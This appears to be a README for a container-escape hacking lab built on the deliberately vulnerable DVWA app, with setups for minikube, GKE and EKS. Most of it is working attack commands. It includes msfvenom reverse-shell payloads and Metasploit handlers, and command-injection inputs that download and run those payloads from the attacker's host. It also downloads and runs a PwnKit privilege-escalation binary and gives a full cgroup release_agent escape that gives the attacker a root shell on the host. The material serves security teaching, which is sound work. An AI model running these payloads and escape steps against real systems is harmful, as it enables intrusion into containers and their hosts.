# Hack DVWA with container escape

The demo consists of the follwoing parts:

- Hack DVWA via command injection to get a reverse shell
- get root rights within the container via CVE-2021-4034
- abuse the misconfiguration --privileged of container

As a base i used the DVWA docker build from [opsxcq](https://github.com/opsxcq/docker-vulnerable-dvwa).

## Login to DVWA with default credentials

To login you can use the following credentials:

- Username: admin
- Password: password

## kubernetes cluster (minikube)

If minikube is used, you can easily start and build the container locally:

```bash
# NOTE: if minikube is used with docker desktop, you need to configure docker desktop before. The node got the ip 192.168.59.100
minikube start --memory 4096 --cpus 4
eval $(minikube docker-env)
docker build -t docker.io/hacklab/dvwa-container-escape -f ./Dockerfile .
```

Deploy DVWA into Minikube

```bash
kubectl apply -f dvwa-minikube-deployment.yaml
```

Forward the pod ports locally:

```bash
kubectl get pods
NAME                                     READY   STATUS    RESTARTS   AGE
dvwa-container-escape-77fcfd454b-qkrt4   1/1     Running   0          63s

kubectl port-forward dvwa-container-escape-77fcfd454b-qkrt4 8080:80
```

Login to the DVWA with the default credential and click on the `Create / Reset database` button and it will generate any aditional configuration needed.

Create the meterpreter for the DVWA container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.59.1 LPORT=4242 -f elf > met-container
```

Start the metasploit framework for the DVWA container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

Create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.59.1 LPORT=4243 -f elf > met-host
```

Start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

Execute the DVWA command injection exploit. After re-login go to [http://localhost:8080/vulnerabilities/exec/](http://localhost:8080/vulnerabilities/exec/) and execute the following commands.

```
;curl -vk http://192.168.59.1:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

Now you have a reverse meterpreter connection from the container, type `shell` to get a bash.

Get root within the DVWA container

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Execute the following commands in your DVWA root shell to get a root shell from the docker host

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://192.168.59.1:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now you got a root shell from your container host.

To delete the deployment just run:

```
kubectl delete -f dvwa-minikube-deployment.yaml
```

## kubernetes cluster (gke)

Connect to your gke cluster

```bash
gcloud container clusters get-credentials cluster-1 --zone us-central1-c --project <project name>
```

Configure Docker with the following command

```bash
gcloud auth configure-docker
```

Build the container image and upload to container registry of your project

```bash
docker build -t dvwa-container-escape -f ./Dockerfile .

docker tag dvwa-container-escape:latest gcr.io/<project-id>/dvwa-container-escape

docker push gcr.io/<project-id>/dvwa-container-escape
```

Deploy DVWA into gke cluster

```bash
kubectl apply -f dvwa-gke-deployment.yaml
```

Forward the pod ports locally:

```bash
kubectl get pods
NAME                                     READY   STATUS    RESTARTS   AGE
dvwa-container-escape-76df94fbf7-j2nlj   1/1     Running   0          7s

kubectl port-forward dvwa-container-escape-76df94fbf7-j2nlj 8080:80
```

Login to the DVWA with the default credential and click on the `Create / Reset database` button and it will generate any aditional configuration needed.

Create the meterpreter for the DVWA container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<your public ip> LPORT=4242 -f elf > met-container
```

Start the metasploit framework for the DVWA container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

Create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<your public ip> LPORT=4243 -f elf > met-host
```

Start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

Execute the DVWA command injection exploit. After re-login go to [http://localhost:8080/vulnerabilities/exec/](http://localhost:8080/vulnerabilities/exec/) and execute the following commands.

```
;curl -vk http://<your public ip>:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

Now you have a reverse meterpreter connection from the container, type `shell` to get a bash.

Get root within the DVWA container

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Execute the following commands in your DVWA root shell to get a root shell from the docker host

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://<your public ip>:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now you got a root shell from your container host.

To delete the deployment just run:

```
kubectl delete -f dvwa-minikube-deployment.yaml
```

## kubernetes cluster (eks)

login to eks docker registry

```bash
aws ecr get-login-password --region us-east-2 | docker login --username AWS --password-stdin 921877552404.dkr.ecr.us-east-2.amazonaws.com
```

build docker image

```bash
docker build -t dvwa-container-escape .
```

change docker tag and push image to eks registry

```bash
docker tag dvwa-container-escape:latest 921877552404.dkr.ecr.us-east-2.amazonaws.com/dvwa-container-escape:latest
docker push 921877552404.dkr.ecr.us-east-2.amazonaws.com/dvwa-container-escape:latest
```

start pod

```bash
kubectl apply -f dvwa-eks-deployment.yaml
```

```bash
kubectl get pods
NAME                                     READY   STATUS    RESTARTS   AGE
dvwa-container-escape-686567d66c-7qqhk   1/1     Running   0          27h

kubectl port-forward dvwa-container-escape-686567d66c-7qqhk 8080:80
```

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.
